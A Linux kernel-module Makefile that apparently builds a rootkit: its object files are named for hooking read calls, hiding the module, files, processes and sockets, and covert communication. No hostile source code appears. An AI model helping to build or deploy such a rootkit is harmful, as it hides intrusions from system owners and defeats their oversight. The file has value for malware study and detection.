obj-m += cool_mod.o
cool_mod-objs := mod.o sysmap.o global.o hook_read.o hide_module.o hide_sockets.o hide_files.o hide_processes.o covert_communication.o

all: sysmap.h
		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

sysmap.h:
		sh ./create_sysmap.sh

clean:
		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
